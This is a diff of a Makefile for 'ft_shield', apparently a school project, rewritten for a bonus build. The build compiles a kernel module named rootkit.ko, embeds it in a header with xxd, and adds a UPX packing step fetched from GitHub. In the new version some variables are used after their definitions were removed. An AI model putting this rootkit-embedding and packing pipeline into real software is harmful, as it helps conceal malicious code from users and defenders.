@@ -1,55 +1,33 @@
-# COLORS #
-#
+# bonus/Makefile
+
+# COLORS
 GREEN 	= @echo "\033[0;32m"
-BLUE 	= @echo "\033[0;34m"
-PURPLE 	= @echo "\033[0;35m"
-CYAN 	= @echo "\033[0;36m"
 RESET 	= "\033[1;0m"
 
-# VARIABLES #
-#
-NAME 		= ft_shield
-BONUS_NAME 	= ft_shield_bonus
+# VARIABLES
+NAME 		= ft_shield_bonus
 CC 			= gcc
-CFLAGS 		= -Wall -Wextra -g -fsanitize=address -MMD -MP -Werror $(INCLUDE)
+CFLAGS 		= -Wall -Wextra -g -fsanitize=address -MMD -MP -Werror
 LDFLAGS		= -fsanitize=address
-#LDFLAGS 	= -L/opt/homebrew/Cellar/oath-toolkit/2.6.11/lib -fsanitize=address
-INCLUDE 	= -I/usr/include/liboath
-#FLags for mac
-#LDFLAGS 	= -L/opt/homebrew/Cellar/oath-toolkit/2.6.11/lib -fsanitize=address
-#INCLUDE 	= -I/opt/homebrew/Cellar/oath-toolkit/2.6.11/include/liboath
-LDLIBS		= -loath -lutil
+LDLIBS		= -lutil
 
-
-# PATHS #
-#
+# PATHS
 SRC_PATH    	= srcs
-# SUBFILE1_PATH   = reporter
-# SUBFILE2_PATH   = daemon
 OBJ_PATH    	= objects
-TOOLS_OBJ_PATH	= tools/objects
 
-# SOURCES #
-#
-# SUBFILE1_SRC = reporter.c
-# SUBFILE2_SRC = daemon.c
-
-
+# SOURCES
 SRC =	main.c \
 		daemon.c \
 		socket.c \
 		authentication.c
 
+SRCS 	  = $(addprefix $(SRC_PATH)/, $(SRC))
+OBJS 	  = $(addprefix $(OBJ_PATH)/, $(SRC:%.c=%.o))
 
-UPX_VERSION = 4.2.4
-UPX_EXECUTABLE = upx-$(UPX_VERSION)-amd64_linux/upx
-
+# RULES
 # RULES #
 #
 all: $(NAME)
-
-SRCS 	  = $(addprefix $(SRC_PATH)/, $(SRC))
-OBJS 	  = $(addprefix $(OBJ_PATH)/, $(SRC:%.c=%.o))
 
 $(OBJ_PATH):
 	mkdir -p $(OBJ_PATH)
@@ -80,7 +58,7 @@ $(OBJ_PATH)/%.o: $(SRC_PATH)/%.c gen_secret | $(OBJ_PATH)
 	echo $(get_secret)
 	$(CC) $(CFLAGS) -DSECRET=\"$(SECRET)\" -c $< -o $@
 
-$(NAME): $(OBJS) Makefile
+$(NAME): modules $(OBJS) Makefile
 	$(CC) $(OBJS) $(LDFLAGS) $(LDLIBS) -o $(NAME)
 	echo $(SECRET)
 	qrencode -t ANSI "otpauth://totp/ft_shield:jalvarodro@example.com?secret=$(SECRET)&issuer=ft_shield"
@@ -102,9 +80,19 @@ $(NAME): $(OBJS) Makefile
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠛⠋⠉⠉⠁⠀⠀⠀⠀\n\
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁\n"
 
-bonus: $(BONUS_NAME)
+modules:
+	$(MAKE) -C ./srcs/modules/
+	xxd -i srcs/modules/rootkit.ko > includes/rootkit.h
 
-$(BONUS_NAME):
+$(UPX_EXECUTABLE): 
+	wget https://github.com/upx/upx/releases/download/v$(UPX_VERSION)/upx-$(UPX_VERSION)-amd64_linux.tar.xz
+	tar -xvf  upx-$(UPX_VERSION)-amd64_linux.tar.xz
+	rm -rf upx-$(UPX_VERSION)-amd64_linux.tar.xz
+
+pack: $(UPX_EXECUTABLE) $(NAME)
+	./$(UPX_EXECUTABLE) --best $(NAME)
+
+bonus:
 	$(MAKE) -C ./bonus/
 
 -include $(OBJS:.o=.d)
@@ -123,3 +111,4 @@ fclean: clean
 re: fclean all
 
 .PHONY: all clean fclean re
+
